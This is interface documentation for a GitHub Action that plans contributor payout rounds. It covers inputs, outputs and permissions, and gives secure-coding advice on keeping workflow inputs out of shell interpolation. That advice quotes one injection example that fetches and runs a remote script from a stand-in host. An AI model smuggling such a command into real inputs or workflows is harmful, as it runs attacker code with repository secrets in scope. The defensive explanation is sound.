# GitHub Action

`dedalo-org/dedalo@v0` is a composite action that installs the released binary
and runs one subcommand.

```yaml
- uses: actions/checkout@v5
  with:
    fetch-depth: 0

- uses: dedalo-org/dedalo@v0
  id: dedalo
  with:
    command: plan
    amount: "1000"
```

The operational guidance — whole workflows, scheduling, what to run on every
push — is in [In CI](../operating/ci.md). This page is the interface.

## Inputs

| Input | Default | Meaning |
| --- | --- | --- |
| `version` | `latest` | Release to use, e.g. `v0.0.1`. |
| `command` | `status` | `status`, `scan`, `contributors`, `plan` or `settle`. |
| `amount` | `""` | Size of the round, for `plan` and `settle`, in the configured asset. |
| `since` | `""` | Start after this revision instead of the last settled commit. |
| `execute` | `"false"` | Broadcast for real instead of simulating. |
| `working-directory` | `.` | Repository to operate on. |
| `summary` | `"true"` | Write the payout plan to the workflow run summary. |

### `version`

Defaults to the latest release. **Pin it** for a workflow whose output anybody
relies on: `latest` means a new release changes what your pipeline runs without
a commit in your repository.

### `execute`

Defaults to `false`, because the safe thing must be the default. Setting it to
`true` will not broadcast anything today: Dedalo holds no signing key by
design, and a round is funded by people executing what `dedalo propose` prints.

## Outputs

| Output | Meaning |
| --- | --- |
| `json` | Raw JSON output of the command. |
| `plan-id` | Content hash of the payout plan, when the command produced one. |
| `total` | Total that would move, in base units. |

```yaml
- run: echo "round ${{ steps.dedalo.outputs.plan-id }}"
```

## What it does before running

**Checks for a shallow clone.** Attribution reads merge history, and a shallow
clone produces an *empty round* rather than an error. The action warns and
runs `git fetch --unshallow` — but set `fetch-depth: 0` on `actions/checkout`
so it never has to.

**Installs the binary** via `install.sh`, which verifies the published SHA-256.

## How it is written, and why you should copy that

This action executes in other people's repositories with their secrets in
scope. Two rules it follows without exception:

- **Inputs reach the shell through `env:`, never through `${{ }}` interpolated
  into a `run:` block.** An `amount` of `$(curl evil.sh | sh)` interpolated
  into a script executes. `zizmor` fails the build on this.
- **Commands with side effects run once.** `action.yml` deliberately does not
  re-run `settle` to render nicer output. If you wrap it, format the `--json`
  output rather than invoking it a second time.

## Permissions

`plan`, `scan`, `contributors`, `status` and `verify` need `contents: read` and
nothing else. There is no token to give it, no secret to configure, and no
network call it makes on its own behalf.

```yaml
permissions:
  contents: read
```

That is the whole permission surface, and it is short because Dedalo holds no
key. See [Funding from a multisig](../operating/multisig.md#why-the-key-is-not-in-ci).
